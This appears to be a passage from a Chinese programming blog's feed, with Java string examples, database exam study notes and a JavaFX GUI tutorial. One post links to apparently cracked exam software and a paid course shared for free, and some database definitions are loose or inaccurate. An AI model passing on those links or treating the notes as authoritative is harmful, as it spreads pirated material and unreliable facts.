StringBuffer(str).reverse().toString();    System.out.println(str2);}打印结果:olleh olleh</code></pre><h3 id="字符串查找"><a href="#字符串查找" class="headerlink" title="字符串查找"></a>字符串查找</h3><pre><code>public static void main(String[] args) {  String strOrig = &quot;Google Runoob Taobao&quot;;  int intIndex = strOrig.indexOf(&quot;Runoob&quot;);  if(intIndex == - 1){     System.out.println(&quot;没有找到字符串 Runoob&quot;);  }else{     System.out.println(&quot;Runoob 字符串位置 &quot; + intIndex);  }}</code></pre><h3 id="字符串分割"><a href="#字符串分割" class="headerlink" title="字符串分割"></a>字符串分割</h3><p>split(string) 方法通过指定分隔符将字符串分割为数组</p><pre><code>public static void main(String args[]){      String str = &quot;www-runoob-com&quot;;      String[] temp;      String delimeter = &quot;-&quot;;  // 指定分割字符      temp = str.split(delimeter); // 分割字符串      // 普通 for 循环      for(int i =0; i &lt; temp.length ; i++){         System.out.println(temp[i]);         System.out.println(&quot;&quot;);      }      System.out.println(&quot;------java for each循环输出的方法-----&quot;);      String str1 = &quot;www.runoob.com&quot;;      String[] temp1;      String delimeter1 = &quot;\\.&quot;;  // 指定分割字符， . 号需要转义      temp1 = str1.split(delimeter1); // 分割字符串      for(String x :  temp1){         System.out.println(x);         System.out.println(&quot;&quot;);      }   }方式二：Java 中我们可以使用 StringTokennizer 设置不同分隔符来分隔字符串，默认的分隔符是：空格、制表符（\t）、换行符(\n）、回车符（\r）import java.util.StringTokenizer;public class Main {public static void main(String[] args) {    String str = &quot;This is String , split by StringTokenizer, created by runoob&quot;;    StringTokenizer st = new StringTokenizer(str);    System.out.println(&quot;----- 通过空格分隔 ------&quot;);    while (st.hasMoreElements()) {        System.out.println(st.nextElement());    }    System.out.println(&quot;----- 通过逗号分隔 ------&quot;);    StringTokenizer st2 = new StringTokenizer(str, &quot;,&quot;);    while (st2.hasMoreElements()) {        System.out.println(st2.nextElement());    }}}</code></pre><h3 id="字符串大小写转换"><a href="#字符串大小写转换" class="headerlink" title="字符串大小写转换"></a>字符串大小写转换</h3><pre><code> String strUpper = str.toUpperCase();//小转大String strLower = str.toLowerCase();//大转小</code></pre><h3 id="字符串区域是否相等"><a href="#字符串区域是否相等" class="headerlink" title="字符串区域是否相等"></a>字符串区域是否相等</h3><p>以下实例使用了 regionMatches() 方法测试两个字符串区域是否相等：</p><pre><code> public static void main(String[] args){    String first_str = &quot;Welcome to Microsoft&quot;;    String second_str = &quot;I work with microsoft&quot;;    boolean match1 = first_str.            regionMatches(11, second_str, 12, 9);    boolean match2 = first_str.            regionMatches(true, 11, second_str, 12, 9); //第一个参数 true 表示忽略大小写区别    System.out.println(&quot;区分大小写返回值：&quot; + match1);    System.out.println(&quot;不区分大小写返回值：&quot; + match2);}</code></pre><h3 id="字符串创建的性能"><a href="#字符串创建的性能" class="headerlink" title="字符串创建的性能"></a>字符串创建的性能</h3><pre><code>    public class StringComparePerformance{   public static void main(String[] args){            long startTime = System.currentTimeMillis();      for(int i=0;i&lt;50000;i++){         String s1 = &quot;hello&quot;;         String s2 = &quot;hello&quot;;       }      long endTime = System.currentTimeMillis();      System.out.println(&quot;通过 String 关键词创建字符串&quot;       + &quot; : &quot;+ (endTime - startTime)       + &quot; 毫秒&quot; );             long startTime1 = System.currentTimeMillis();      for(int i=0;i&lt;50000;i++){         String s3 = new String(&quot;hello&quot;);         String s4 = new String(&quot;hello&quot;);      }      long endTime1 = System.currentTimeMillis();      System.out.println(&quot;通过 String 对象创建字符串&quot;       + &quot; : &quot; + (endTime1 - startTime1)      + &quot; 毫秒&quot;);   }}</code></pre><h3 id="字符串优化"><a href="#字符串优化" class="headerlink" title="字符串优化"></a>字符串优化</h3><p>String.intern() 方法来优化字符串：</p><pre><code>    public class StringOptimization {    public static void main(String[] args){        String variables[] = new String[50000];              for( int i=0;i &lt;50000;i++){            variables[i] = &quot;s&quot;+i;        }        long startTime0 = System.currentTimeMillis();        for(int i=0;i&lt;50000;i++){            variables[i] = &quot;hello&quot;;        }        long endTime0 = System.currentTimeMillis();        System.out.println(&quot;直接使用字符串： &quot;+ (endTime0 - startTime0)  + &quot; ms&quot; );        long startTime1 = System.currentTimeMillis();            for(int i=0;i&lt;50000;i++){            variables[i] = new String(&quot;hello&quot;);        }        long endTime1 = System.currentTimeMillis();        System.out.println(&quot;使用 new 关键字：&quot; + (endTime1 - startTime1) + &quot; ms&quot;);        long startTime2 = System.currentTimeMillis();        for(int i=0;i&lt;50000;i++){            variables[i] = new String(&quot;hello&quot;);            variables[i] = variables[i].intern();                  }        long endTime2 = System.currentTimeMillis();        System.out.println(&quot;使用字符串对象的 intern() 方法: &quot;         + (endTime2 - startTime2)        + &quot; ms&quot;);    }}</code></pre><h3 id="字符串格式化"><a href="#字符串格式化" class="headerlink" title="字符串格式化"></a>字符串格式化</h3><pre><code>import java.util.*;public class StringFormat {    public static void main(String[] args){        double e = Math.E;        System.out.format(&quot;%f%n&quot;, e);        System.out.format(Locale.CHINA  , &quot;%-10.4f%n%n&quot;, e);  //指定本地为中国（CHINA）    }}</code></pre><h4 id="小数精度"><a href="#小数精度" class="headerlink" title="小数精度"></a>小数精度</h4><pre><code>    Java当中如果想对数据的精度进行约束  DecimalFormat df = new DecimalFormat(&quot;#0.0000000&quot;);//精度定义，小数点后几个0，表示保留几位小数      System.out.print(df.format(area));将变量的值加入到df.fromat方法当中。加入你想查看算法是否超超时可以用以下方法来获取程序运行的毫秒数  long a=System.currentTimeMillis();      System.out.println(a);</code></pre><h3 id="字符串拼接效率"><a href="#字符串拼接效率" class="headerlink" title="字符串拼接效率"></a>字符串拼接效率</h3><pre><code>    public class StringConcatenate {    public static void main(String[] args){        long startTime = System.currentTimeMillis();        for(int i=0;i&lt;5000;i++){            String result = &quot;This is&quot;            + &quot;testing the&quot;            + &quot;difference&quot;+ &quot;between&quot;            + &quot;String&quot;+ &quot;and&quot;+ &quot;StringBuffer&quot;;        }        long endTime = System.currentTimeMillis();        System.out.println(&quot;字符串连接&quot;         + &quot; - 使用 + 操作符 : &quot;         + (endTime - startTime)+ &quot; ms&quot;);        long startTime1 = System.currentTimeMillis();        for(int i=0;i&lt;5000;i++){            StringBuffer result = new StringBuffer();            result.append(&quot;This is&quot;);            result.append(&quot;testing the&quot;);            result.append(&quot;difference&quot;);            result.append(&quot;between&quot;);            result.append(&quot;String&quot;);            result.append(&quot;and&quot;);            result.append(&quot;StringBuffer&quot;);        }        long endTime1 = System.currentTimeMillis();        System.out.println(&quot;字符串连接&quot;         + &quot; - 使用 StringBuffer : &quot;        + (endTime1 - startTime1)+ &quot; ms&quot;);    }}</code></pre>]]></content>
      
      
      <categories>
          
          <category> JAVA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> String </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机三级数据库备考资源</title>
      <link href="/2020/02/24/database/note2/"/>
      <url>/2020/02/24/database/note2/</url>
      
        <content type="html"><![CDATA[<h3 id="认知"><a href="#认知" class="headerlink" title="认知"></a>认知</h3><p>干什么能容易呢？干什么都不容易，我们学习专项知识时必定要下一番功夫。我只喜欢白嫖，并且善于白嫖，为啥用微云呢，因为百度盘的连接经常莫名其妙失效。</p><h3 id="刷题软件"><a href="#刷题软件" class="headerlink" title="刷题软件"></a>刷题软件</h3><p>软件是2017年的学习版，懂就好。<br><a href="https://share.weiyun.com/5Sk02hc" target="_blank" rel="noopener">微云连接</a><br><img src="http://img.ahdy.top/2020-02-29_060902.png" alt><br><a href="https://share.weiyun.com/5vJF9ed" target="_blank" rel="noopener">2018数据库专项题库</a></p><p><a href="https://share.weiyun.com/5I087gW" target="_blank" rel="noopener">手机刷题软件（年代久远，介意慎下）</a></p><h3 id="数据库全程班视频"><a href="#数据库全程班视频" class="headerlink" title="数据库全程班视频"></a>数据库全程班视频</h3><p>原价199课程，720p，2020年新出的全程班教程，讲解全部考点。</p><p><a href="https://share.weiyun.com/5PsNum1" target="_blank" rel="noopener">微云连接</a></p><h2 id="加油！"><a href="#加油！" class="headerlink" title="加油！"></a>加油！</h2>]]></content>
      
      
      <categories>
          
          <category> 国三 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Computer </tag>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库笔记</title>
      <link href="/2020/02/23/database/note/"/>
      <url>/2020/02/23/database/note/</url>
      
        <content type="html"><![CDATA[<h3 id="数据库应用系统生命周期"><a href="#数据库应用系统生命周期" class="headerlink" title="数据库应用系统生命周期"></a>数据库应用系统生命周期</h3><pre><code>DMS 数据库系统(概念最大的系统)DBAS 数据库应用系统DBMS 数据库管理系统DBA 数据库管理员</code></pre><p>1.掌握DBAS生命周期，生命周期模型</p><p>2.掌握系统规划与定义内容</p><p>3.掌握数据,功能，性能，需求分析</p><p>4.理解，概念设计（ER），逻辑（3NF），物理设计</p><p>5.熟悉数据库实现与部署</p><h4 id="软件工程与软件开发方法"><a href="#软件工程与软件开发方法" class="headerlink" title="软件工程与软件开发方法"></a>软件工程与软件开发方法</h4><p>DBS包含软件工程思想<br>软件工程开发的目的，提高软件质量，开发速度，降低开发成本</p><p>软件开发方法：瀑布模型，螺旋模型，快速原型模型。</p><h4 id="瀑布模型"><a href="#瀑布模型" class="headerlink" title="瀑布模型"></a>瀑布模型</h4><p>该模型分为六个阶段:</p><pre><code>项目规划系统分析总体设计详细设计编码调式与集成测试运行维护阶段</code></pre><p><img src="http://img.ahdy.top/2020-02-26_153750.png" alt="从上到下依次执行"><br>缺点:难以进行修改，难以满足用户需求</p><h4 id="快速原型模型"><a href="#快速原型模型" class="headerlink" title="快速原型模型"></a>快速原型模型</h4><p>弥补了瀑布模型难以修改的缺点。<br><img src="http://img.ahdy.top/2020-02-26_154004.png" alt><br>缺点:需要收集大量用户需求后开发</p><h4 id="螺旋模型"><a href="#螺旋模型" class="headerlink" title="螺旋模型"></a>螺旋模型</h4><p><img src="http://img.ahdy.top/2020-02-26_154127.png" alt><br>融合了前两个模型的优点。有效降低开发风险，但对开发人员风险评估能力要求较高</p><h4 id="数据库系统生命周期模型"><a href="#数据库系统生命周期模型" class="headerlink" title="数据库系统生命周期模型"></a>数据库系统生命周期模型</h4><p><img src="http://img.ahdy.top/2020-02-26_154416.png" alt></p><h3 id="规划与分析"><a href="#规划与分析" class="headerlink" title="规划与分析"></a>规划与分析</h3><p><img src="http://img.ahdy.top/2020-02-26_155134.png" alt></p><h4 id="可行性分析"><a href="#可行性分析" class="headerlink" title="可行性分析"></a>可行性分析</h4><p><img src="http://img.ahdy.top/2020-02-26_155554.png" alt></p><h4 id="DMAS成本"><a href="#DMAS成本" class="headerlink" title="DMAS成本"></a>DMAS成本</h4><p>1.系统软硬件购置</p><p>2.人工费用</p><p>3.系统安装，运行，维护等费用</p><h4 id="项目规划"><a href="#项目规划" class="headerlink" title="项目规划"></a>项目规划</h4><p>项目规划在进行可行性分析之后<br>1.我们需要确定项目目标和范围</p><p>2.根据DBAS软件开发模型，分解整个项目用和工作活动任务</p><p>3.估算项目所需的各种资源</p><p>4.指定合理的DBMS项目计划，包括进度，成本，质量等方面的预测和控制方案 </p><h3 id="需求分析-软件开发中极为重要的阶段"><a href="#需求分析-软件开发中极为重要的阶段" class="headerlink" title="需求分析(软件开发中极为重要的阶段)"></a>需求分析(软件开发中极为重要的阶段)</h3><p>从对数据库进行组织与储存角度，用户视图出发，分辨辨识应用领域所管理的各类数据项和数据结构，是形成数据字典的主要内容。</p><p>数据字典包括:数据项，数据结构，数据流，数据存储，处理过程。</p><h4 id="功能需求分析"><a href="#功能需求分析" class="headerlink" title="功能需求分析"></a>功能需求分析</h4><p>对DBAS因该具有的功能进行分析，DBAS需求分析的核心环节，描述了一个系统应该做什么。</p><h4 id="数据处理需求分析"><a href="#数据处理需求分析" class="headerlink" title="数据处理需求分析"></a>数据处理需求分析</h4><p>从数据访问和处理角度，明确对各类数据项所需进行时的数据访问操作。</p><h4 id="性能需求分析"><a href="#性能需求分析" class="headerlink" title="性能需求分析"></a>性能需求分析</h4><p>描述系统应当做到什么程度</p><p>DBAS包括以下指标<br>数据操作响应时间，系统吞吐量，允许并发访问的最大用户数<br>TPS代价值:衡量系统性价比的指标。</p><p>影响TPS值的因素:系统硬件资源，网络通信设备性能，数据库逻辑设计，物理设计质量，DBMS配置和性能，数据库应用系统自身设定</p><h4 id="其他需求分析"><a href="#其他需求分析" class="headerlink" title="其他需求分析"></a>其他需求分析</h4><p>存储需求分析，安全性需求分析，备份和回复需求分析<br><img src="http://img.ahdy.top/2020-02-26_161742.png" alt></p><h4 id="需求分析方法"><a href="#需求分析方法" class="headerlink" title="需求分析方法"></a>需求分析方法</h4><p>结构化与功能建模方法:DFD IDEFO<br>数据建模方法:IDEF1X</p><p><img src="http://img.ahdy.top/2020-02-26_165530.png" alt></p><h3 id="系统设计"><a href="#系统设计" class="headerlink" title="系统设计"></a>系统设计</h3><p>概念设计，逻辑设计，物理设计，按顺序进行。</p><p>概念设计:数据库概念模型设计，系统总体设计(ER图)</p><h4 id="系统总图设计"><a href="#系统总图设计" class="headerlink" title="系统总图设计"></a>系统总图设计</h4><p>dbas是由硬件和软件组成的复杂系统，在设计上应用语句自上而下，由简到繁，逐步求精。</p><h4 id="逻辑设计"><a href="#逻辑设计" class="headerlink" title="逻辑设计"></a>逻辑设计</h4><p>1.逻辑结构设计</p><p>2.应用程序概要设计</p><p>3.事务概要设计的任务</p><p><img src="http://img.ahdy.top/2020-02-26_162436.png" alt></p><h4 id="物理设计"><a href="#物理设计" class="headerlink" title="物理设计"></a>物理设计</h4><p>1.数据库物理结构设计</p><p>2.数据库事务详细设计</p><p>3.应用程序详细设计<br><img src="http://img.ahdy.top/2020-02-26_162612.png" alt></p><h3 id="实现和部署"><a href="#实现和部署" class="headerlink" title="实现和部署"></a>实现和部署</h3><p><img src="http://img.ahdy.top/2020-02-26_162933.png" alt="交互使用阶段"></p><h3 id="运行管理与维护"><a href="#运行管理与维护" class="headerlink" title="运行管理与维护"></a>运行管理与维护</h3><p><img src="http://img.ahdy.top/2020-02-26_163221.png" alt></p><h3 id="数据库概念设计"><a href="#数据库概念设计" class="headerlink" title="数据库概念设计"></a>数据库概念设计</h3><p>ER图设计，实体矩形，属性椭圆，联系菱形。</p><p>联系:<br>标定型联系，非确定性联系 ，分类联系，非确定联系<br>这几种联系方式其实是表达着属性与实体之间，实体实体间，属性属性间的关系。 </p><p>标定联系:精准联系，需要了解双亲实体  一对一</p><p>非确定联系:精准联系，不需要具体了解双亲实体，只要实现精准确认，无需依靠多个属性来确认。一对多</p><p>分类联系:不同的情况下分为不同的实体。例如，警察有刑警，民警。可理解为有共同属性。</p><p>非标定关系:多对多模式，无法互相确认。</p><h3 id="数据库逻辑设计"><a href="#数据库逻辑设计" class="headerlink" title="数据库逻辑设计"></a>数据库逻辑设计</h3><p>物理设计来源于逻辑设计  </p><p>逻辑设计可将ER图转关成关系模式  </p><p>重点:优化关系模式满足3NF.</p><h4 id="如何将ER图转换成关系模式"><a href="#如何将ER图转换成关系模式" class="headerlink" title="如何将ER图转换成关系模式"></a>如何将ER图转换成关系模式</h4><p>一对一:在两个实体上添加另一个实体的主键  </p><p>一比n:在N端添加另一端主键</p><p>多对多:在尸体上添加MN端主键。</p><p>11n:n端添加另两个主键</p><p>mnp:实体上分别添加三个类主键</p><p>一般数据库当中只会涉及到3NF.</p><h4 id="什么是NF"><a href="#什么是NF" class="headerlink" title="什么是NF?"></a>什么是NF?</h4><p>范式:是符合一种级别的关系模式的集合</p><p>1nf是关系模式中的基本要求，数据表每一列都是不可分割的数据项同一列不能有多个值。  </p><p>2nf指每个表有且只有一个元素作为关键字，其他数据与主键有着依赖关系。例如前面的分类联系。</p><p>3nf包含2nf属性，并且每个属性互相独立，其中不允许部分依赖，也不传递依赖。</p><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>绘制ER图转换范式是数据库当中必考题目。  </p><h3 id="数据库物理模式"><a href="#数据库物理模式" class="headerlink" title="数据库物理模式"></a>数据库物理模式</h3><p>通过数据库概念设计和逻辑设计范化的关系模式，目的将数据的逻辑描述转换为实现技术，目标是设计存储方案。提高检索速度。</p><h4 id="物理结构"><a href="#物理结构" class="headerlink" title="物理结构"></a>物理结构</h4><p>以文件形式存储外设存储介质，如磁盘上的。</p><p>需要解决的问题，文件组织，文件的结构，文件的存取，索引技术</p><h4 id="索引技术"><a href="#索引技术" class="headerlink" title="索引技术"></a>索引技术</h4><p>索引是一数据快速访问的技术，索引的关键是建立记录域取值与物理地址的映射关系。</p><h4 id="索引技术分类"><a href="#索引技术分类" class="headerlink" title="索引技术分类"></a>索引技术分类</h4><p>散列索引:hash索引，实现记录域取值与物理地址的映射关系。</p><p>有序索引:数据文件和索引文件是有序索引中的两个主题，有序碎银作为索引文件的索引技术，考虑两个关键问题1.组织索引文件中的索引记录 2.如何从索引文件出发，访问数据文件中的数据记录<br>一个数据文件可以有多个查找码或者多个索引文件。<br>其中有序索引又分为聚集索引，非聚集索引，查找码，数据排列是根据索引项来的，排列有序<br>稠密索引，稀疏索引，每个对应于表格数据，反之部分对应表格数据。</p><p>唯一索引:可以确保索引列不包含重复的值，确保每个值的数据组合都是唯一的。</p><h4 id="文件类型"><a href="#文件类型" class="headerlink" title="文件类型"></a>文件类型</h4><p>堆文件:适合数据量很少，插入删除频繁操作的数据。</p><p>顺序文件:支持对于查找码的顺序访问，(查找码)</p><p>聚集文件:适合频繁执行，并且多表连接的查询</p><p>索引文件:数据量基于表上，提高查询效率，范围，模糊查询。</p><p>散列文件:访问随机。</p><h3 id="软件系统体系结构与设计过程"><a href="#软件系统体系结构与设计过程" class="headerlink" title="软件系统体系结构与设计过程"></a>软件系统体系结构与设计过程</h3><p>功能设计一般划分为，总体设计，概要设计，详细设计三个阶段。</p><p>事务设计分为；事务概要设计，事务详细设计。</p><h4 id="软件体系结构"><a href="#软件体系结构" class="headerlink" title="软件体系结构"></a>软件体系结构</h4><p>由构件，连接件，约束。</p><p>风格上:分层结构体系，视图控制器体系结构，客户端，服务器结构</p><h4 id="软件设计过程"><a href="#软件设计过程" class="headerlink" title="软件设计过程"></a>软件设计过程</h4><p>软件开发由设计，实现，测试三个环节，设计又包括概要设计，详细设计；</p><p>概要设计:建立软件系统的总体结构和模块这件的关系。</p><p>详细设计:细化概要设计的功能模块，形成可编程的程序模块，如处理流程，数据结构。</p><h3 id="DBAS总体设计"><a href="#DBAS总体设计" class="headerlink" title="DBAS总体设计"></a>DBAS总体设计</h3><p>设计包括结构设计，过程设计，数据设计<br>特点,应用广泛，速度快，数据安全，人机交互</p><h4 id="常见DBAS结构"><a href="#常见DBAS结构" class="headerlink" title="常见DBAS结构"></a>常见DBAS结构</h4><p>CS模式，客户端服务器  </p><p>BS模式，浏览器服务器<br>特点:将功能分解在表示层，功能层和数据层三个层次上，分别由web服务器，web应用服务器和数据库服务器。维护简便，跨平台性能好 。</p><h4 id="DBAS功能概要设计"><a href="#DBAS功能概要设计" class="headerlink" title="DBAS功能概要设计"></a>DBAS功能概要设计</h4><p>按照逐步求精，模块化 信息隐藏， 功能细化原则。</p><p>由表示层，业务逻辑层，数据访问层，访问持久层四个层次实现。其中业务逻辑层按照高内聚低耦合设计。</p><h3 id="DBAS建模"><a href="#DBAS建模" class="headerlink" title="DBAS建模"></a>DBAS建模</h3><p>统一建模语言（UML）可视化。<br>定义良好，易于表达，功能强大，通用的可视化建模语言。<br>UML定义由语义和表示法两部分组成。</p><p>语义是自然语言描述的，他定义在一个四层框架中</p><p>元元模型层，元模型，模型，用户模型</p><h4 id="视图概念"><a href="#视图概念" class="headerlink" title="视图概念"></a>视图概念</h4><p>视图时对系统的模型在某方面的投影</p><p>UML当中的五种视图:用例视图，环境视图，行为视图，结构视图，实现视图</p><p>UML当中对于业务支持的是活动图，活动图:先后执行次序，并行次序，而流程图只能串行次序</p><p>活动之间的转换由箭头表示，箭头表示执行的方向</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><h4 id="内容实在是太太太多了啊啊啊，后面就不写了，啊哈哈，凭我不做大题考60分的经验来说一下怎么搞这东西，首先把分享的视频，仔细看一边，看不懂没关系，-能记忆就记忆，看完了之后对做选择填空有明显提升。之后，刷题，给题库刷完，不会的记着答案。嗯，祝你前程似锦，告辞！！"><a href="#内容实在是太太太多了啊啊啊，后面就不写了，啊哈哈，凭我不做大题考60分的经验来说一下怎么搞这东西，首先把分享的视频，仔细看一边，看不懂没关系，-能记忆就记忆，看完了之后对做选择填空有明显提升。之后，刷题，给题库刷完，不会的记着答案。嗯，祝你前程似锦，告辞！！" class="headerlink" title="内容实在是太太太多了啊啊啊，后面就不写了，啊哈哈，凭我不做大题考60分的经验来说一下怎么搞这东西，首先把分享的视频，仔细看一边，看不懂没关系， 能记忆就记忆，看完了之后对做选择填空有明显提升。之后，刷题，给题库刷完，不会的记着答案。嗯，祝你前程似锦，告辞！！"></a>内容实在是太太太多了啊啊啊，后面就不写了，啊哈哈，凭我不做大题考60分的经验来说一下怎么搞这东西，首先把分享的视频，仔细看一边，看不懂没关系， 能记忆就记忆，看完了之后对做选择填空有明显提升。之后，刷题，给题库刷完，不会的记着答案。嗯，祝你前程似锦，告辞！！</h4>]]></content>
      
      
      <categories>
          
          <category> 国三 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Computer </tag>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java GUI程序</title>
      <link href="/2020/02/22/fx/fx1/"/>
      <url>/2020/02/22/fx/fx1/</url>
      
        <content type="html"><![CDATA[<h3 id="FX简介"><a href="#FX简介" class="headerlink" title="FX简介"></a>FX简介</h3><p>Sun公司已于2008年12月05日发布了JavaFX技术的正式版，它使您能利用 JavaFX 编程语言开发互联网应用程序(RIA）。该产品于2007年5月在JavaOne大会上首次对外公布。JavaFX技术主要应用于创建Rich Internet Applications（RIAs）。当前的JavaFX包括JavaFX脚本和JavaFX Mobile（一种运营于行动装置的操作系统），今后JavaFX将包括更多的产品。JavaFX Script编程语言（以下称为JavaFX）是一种declarative, statically typed（声明性的、静态类型）脚本语言。<br>——————————简单来说fx弥补了Java GUI 开发的不足</p><h3 id="项目创建"><a href="#项目创建" class="headerlink" title="项目创建"></a>项目创建</h3><p>fx是一个独立的库，在eclipse当中需要对其集成插件，在idea当中就省去了这些操作，because idea already be ready<br><img src="http://img.ahdy.top/2020-02-17_133927.png" alt="初始页面"><br>运行当前页面代码，将会得到一个空白的窗口程序，当然它比swing有着卓越，显著的特性。</p><h3 id="设置按钮及事件响应"><a href="#设置按钮及事件响应" class="headerlink" title="设置按钮及事件响应"></a>设置按钮及事件响应</h3><p><img src="http://img.ahdy.top/2020-02-17_140435.png" alt></p><h4 id="相关代码"><a href="#相关代码" class="headerlink" title="相关代码"></a>相关代码</h4><pre><code>package sample;import javafx.application.Application;import javafx.event.ActionEvent;import javafx.event.EventHandler;import javafx.fxml.FXMLLoader;import javafx.scene.Parent;import javafx.scene.Scene;import javafx.scene.control.Button;import javafx.scene.layout.BorderPane;import javafx.stage.Stage;import java.awt.*;public class Main extends Application {    @Override    public void start(Stage primaryStage) throws Exception{        try{//          Parent root = FXMLLoader.load(getClass().getResource(&quot;sample.fxml&quot;));            BorderPane rt=new BorderPane();            //创建根容器            primaryStage.setTitle(&quot;Super web spider-Writer mailbox:2503963481@qq.com&quot;);            //设置标题内容            primaryStage.setScene(new Scene(rt, 650, 375));            //放入root容器并设置其布局            Button btn=new Button(&quot;click&quot;);            //设置按钮及按钮文字            rt.setCenter(btn);            //设置按钮居中            btn.setOnAction(new EventHandler&lt;ActionEvent&gt;(){            //匿名内部类写法                @Override                public void handle(ActionEvent event) {                    System.out.println(&quot;事件触发！&quot;);                }            });            primaryStage.show();            //布局显现        }catch (Exception e){        }    }    public static void main(String[] args) {        launch(args);    }}</code></pre><h3 id="设置图片"><a href="#设置图片" class="headerlink" title="设置图片"></a>设置图片</h3><p>美化GUI自然少不了图片的装饰<br><img src="http://img.ahdy.top/2020-02-17_141752.png" alt></p><h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><pre><code>package sample;import javafx.application.Application;import javafx.scene.Scene;import javafx.scene.image.Image;import javafx.scene.image.ImageView;import javafx.scene.layout.BorderPane;import javafx.stage.Stage;import java.awt.*;public class Main extends Application {    @Override    public void start(Stage primaryStage) throws Exception{        try{//          Parent root = FXMLLoader.load(getClass().getResource(&quot;sample.fxml&quot;));            BorderPane rt=new BorderPane();            //创建根容器            primaryStage.setTitle(&quot;Super web spider-Writer mailbox:2503963481@qq.com&quot;);            //设置标题内容            primaryStage.setScene(new Scene(rt, 650, 375));            //放入root容器并设置其布局            Image img=new Image(&quot;http://pic.netbian.com/uploads/allimg/180803/084010-15332568109b5b.jpg&quot;);            //url路径            ImageView imageView =new ImageView();            //设置控件用于显示            imageView.setImage(img);            rt.setCenter(imageView);            //放入容器            primaryStage.show();            //布局显现        }catch (Exception e){        }    }    public static void main(String[] args) {        launch(args);    }}</code></pre><h3 id="设置图片大小"><a href="#设置图片大小" class="headerlink" title="设置图片大小"></a>设置图片大小</h3><pre><code>    double with =image.getWidth();    double hight=imge.getHeiget();    primaryStage.setScene(new Scene(rt, 宽, 高));</code></pre><h3 id="加载本地图片"><a href="#加载本地图片" class="headerlink" title="加载本地图片"></a>加载本地图片</h3><pre><code>        File file =new File(&quot;file:&quot;);        String url =file.toURI().toString();</code></pre><p> 图片也可放在项目内，称为资源文件</p><h3 id="容器布局"><a href="#容器布局" class="headerlink" title="容器布局"></a>容器布局</h3><h4 id="水平布局"><a href="#水平布局" class="headerlink" title="水平布局"></a>水平布局</h4><p>HBOX:该布局使控件水平排放并且具有拉伸作用<br><img src="http://img.ahdy.top/2020-02-19_003151.png" alt></p><pre><code>        相关代码-已优化布局        HBox hBox=new HBox();        hBox.setPadding(new Insets(10));        hBox.setAlignment(Pos.CENTER);        TextField textField =new TextField(&quot;请选择文件内容&quot;);        Button select =new Button(&quot;选择文件&quot;);        Button upload =new Button(&quot;上传文件&quot;);        hBox.getChildren().addAll(textField,select,upload);        HBox.setHgrow(textField, Priority.ALWAYS);</code></pre><p><img src="http://img.ahdy.top/2020-02-19_003737.png" alt="加入根容器语法"></p><h4 id="边缘布局"><a href="#边缘布局" class="headerlink" title="边缘布局"></a>边缘布局</h4><p>BorderPane:使控件按照上下左右中的位置摆放</p><h3 id="控件尺寸设置"><a href="#控件尺寸设置" class="headerlink" title="控件尺寸设置"></a>控件尺寸设置</h3><p><img src="http://img.ahdy.top/2020-02-19_004051.png" alt><br><img src="http://img.ahdy.top/2020-02-19_004148.png" alt><br><img src="http://img.ahdy.top/2020-02-19_004751.png" alt></p><p>控件的大小有些时候不是自己能决定的，很大程度取决于使用的容器，当设置控件大小失效时，属于正常显现</p><h3 id="控件布局"><a href="#控件布局" class="headerlink" title="控件布局"></a>控件布局</h3><p><img src="http://img.ahdy.top/2020-02-19_005320.png" alt></p><h3 id="布局嵌套"><a href="#布局嵌套" class="headerlink" title="布局嵌套"></a>布局嵌套</h3><p>布局可以嵌套使用</p><pre><code>import javafx.application.Application;import javafx.event.ActionEvent;import javafx.event.EventHandler;import javafx.scene.Scene;import javafx.scene.control.Button;import javafx.scene.control.TextArea;import javafx.scene.control.TextField;import javafx.scene.image.Image;import javafx.scene.image.ImageView;import javafx.scene.layout.BorderPane;import javafx.scene.layout.HBox;import javafx.scene.layout.Priority;import javafx.stage.Stage;public class Main extends Application {    HBox hbox = new HBox();    TextField textField = new TextField(&quot;Please use URL&quot;);    Button button = new Button(&quot;检测站点&quot;);    javafx.scene.control.TextArea textArea = new TextArea();    @Override    public void start(Stage primaryStage) throws Exception{        try{            //创建根容器            hbox.getChildren().addAll(textField, button);            HBox.setHgrow(textField, Priority.ALWAYS);            // BorderPane里嵌套HBox            BorderPane root = new BorderPane();            root.setTop(hbox);            root.setCenter(textArea);            //布局设置            HBox.setHgrow(textField, Priority.ALWAYS);            primaryStage.setTitle(&quot;Super web spider-Writer mailbox:2503963481@qq.com&quot;);            //设置标题内容            primaryStage.setScene(new Scene(root, 650, 500));            //放入root容器并设置其布局            Image img=new Image(&quot;http://pic.netbian.com/uploads/allimg/180803/084010-15332568109b5b.jpg&quot;);            ImageView imageView =new ImageView();            imageView.setImage(img);//            rt.setCenter(imageView);            primaryStage.show();            button.setOnAction(new EventHandler&lt;ActionEvent&gt;() {            //匿名内部类按钮事件响应                @Override                public void handle(ActionEvent event)                {                    onAdd();                }            });            //布局显现        }catch (Exception e){        }    }    public void onAdd()    {        String str = textField.getText();           //获取用户输入的字符串        textArea.appendText(str + &quot;\n&quot;);            //将用户输入的字符串放入到textArea    }    public static void main(String[] args) {        launch(args);    }}</code></pre><h3 id="CSS引入及样式设置"><a href="#CSS引入及样式设置" class="headerlink" title="CSS引入及样式设置"></a>CSS引入及样式设置</h3><p><a href="https://link.fobshanghai.com/rgbcolor.htm" target="_blank" rel="noopener">RGB工具</a><br>与web界面类似，FX提供了css样式来优化界面，</p><pre><code>读入css后，对场景scene插入css条目scene.getStylesheets().add(getClass().getResource(&quot;Login.css&quot;).toExternalForm());也可以改变某个具体节点node.setStyle(&quot;font-size:15px&quot;); //设置具体风格node.setStyleClass(&quot;title_class&quot;);//设置风格类</code></pre><p>将css与Main.java处于同一路径下</p><h4 id="点号与警号命名的作用"><a href="#点号与警号命名的作用" class="headerlink" title="点号与警号命名的作用"></a>点号与警号命名的作用</h4><pre><code>.xxx{}//通用样式#xxxx{}//特定样式，单独样式如何引用: 控件.getStyleClass().add(&quot;通用名&quot;); 